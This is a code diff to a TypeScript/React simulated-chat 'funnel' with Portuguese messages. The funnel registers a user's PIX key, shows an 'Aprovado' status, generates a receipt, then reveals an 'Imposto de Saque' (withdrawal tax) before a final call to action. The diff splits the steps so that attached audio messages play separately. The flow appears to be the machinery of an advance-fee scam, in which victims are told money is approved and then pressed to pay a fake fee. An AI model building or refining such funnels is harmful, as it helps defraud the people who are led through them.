@@ -251,10 +251,10 @@ const funnelDefinition: {
         "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
         "duration_ms": 2500
       },
-      "nextStep": "step9_pix_registered_and_audio"
+      "nextStep": "step9_pix_registered_message"
     },
-    "step9_pix_registered_and_audio": {
-      "key": "step9_pix_registered_and_audio",
+    "step9_pix_registered_message": {
+      "key": "step9_pix_registered_message",
       "type": "displayMessage",
       "delay_ms": 500,
       "data": {
@@ -265,7 +265,16 @@ const funnelDefinition: {
           "Nome": "{{userName}}",
           "Chave Pix": "{{chavePix}}",
           "Status": "Aprovado"
-        },
+        }
+      },
+      "nextStep": "step9b_audio_message"
+    },
+     "step9b_audio_message": {
+      "key": "step9b_audio_message",
+      "type": "displayMessage",
+      "delay_ms": 200,
+      "data": {
+        "message": "Por favor, ouça a próxima mensagem:",
         "audioUrl": "https://media.vocaroo.com/mp3/1dTwVDw858sb"
       },
       "nextStep": "step10_ask_generate_receipt"
@@ -298,10 +307,10 @@ const funnelDefinition: {
             {"variable": "{{taxaValor}}", "x": 750, "y": 330, "font": "Arial Bold", "size": 16, "color": "#008000"}
         ]
       },
-      "nextStep": "step12_reveal_tax_and_audio"
+      "nextStep": "step12_reveal_tax_message"
     },
-    "step12_reveal_tax_and_audio": {
-      "key": "step12_reveal_tax_and_audio",
+    "step12_reveal_tax_message": {
+      "key": "step12_reveal_tax_message",
       "type": "displayMessage",
       "delay_ms": 3000,
       "data": {
@@ -311,7 +320,16 @@ const funnelDefinition: {
           "Titular": "{{userName}}",
           "Chave Pix": "{{chavePix}}",
           "Imposto de Saque": "{{taxaValor}}"
-        },
+        }
+      },
+      "nextStep": "step12b_audio_message"
+    },
+    "step12b_audio_message": {
+      "key": "step12b_audio_message",
+      "type": "displayMessage",
+      "delay_ms": 200,
+      "data": {
+        "message": "Ouça com atenção a etapa final:",
         "audioUrl": "https://media.vocaroo.com/mp3/16Zw1tvwsXFB"
       },
       "nextStep": "step13_final_justification_and_cta"
@@ -1309,3 +1327,4 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 };
 
 export default SimulatedChatFlow;
+
